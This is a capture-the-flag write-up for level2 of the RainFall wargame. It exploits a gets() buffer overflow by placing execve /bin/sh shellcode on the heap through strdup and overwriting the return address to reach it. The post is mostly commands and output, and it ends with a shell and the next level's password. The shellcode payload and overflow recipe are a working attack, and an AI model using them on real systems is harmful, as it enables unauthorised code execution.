As for the previous level, we have a call to gets which is vulnerable to buffer overflow attacks. But this time, a check is made to make sure that the return of the function does not point to an address in the stack (using the 0xb0000000 mask). However, there is a call to strdup which records the user's input on the heap and which we can exploit.

The address space layout randomization (ASLR) is off, meaning the memory addresses associated with running processes are predictable:
```
level2@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
```
So, we get the address of our input registered on the heap (0x0804a008) using ltrace:
```
level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff7d4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                    = 0
gets(0xbffff6dc, 0, 0, 0xb7e5ec73, 0x80482b5)                         = 0xbffff6dc
puts("ok")                                                            = 3
strdup("ok")                                                          = 0x0804a008
+++ exited (status 8) +++
```
<br />
Now Using gdb, we find that there are 80 bytes needed to reach the return address:
```
python -c "print 'A' * 80 + 'ABCD'" > /tmp/exploit
```

```
(gdb) r < /tmp/exploit
Starting program: /home/user/level2/level2 < /tmp/exploit
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDAAAAAAAAAAAAABCD

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
```

Now we just have to write or find a shellcode. On [this website](https://shell-storm.org/shellcode/), we find a lot of ready-to-use shellcodes. [this one](https://shell-storm.org/shellcode/files/shellcode-841.php) corresponds to what we want to do. It is 21 bytes long so we need to complete our input with 59 '\x90' bytes (the 'No Operation' instruction), followed by the address of our shellcode on the heap, in the little endian convention:
```
level2@RainFall:~$ python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x90' * 59 + '\x08\xa0\x04\x08'" > /tmp/exploit
```
<br />
Finally, we just have to launch the program by passing our crafted input:
```
level2@RainFall:~$ cat /tmp/exploit - | ./level2 
1���
    Qh//shh/bin��̀������������������������������������������������������
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```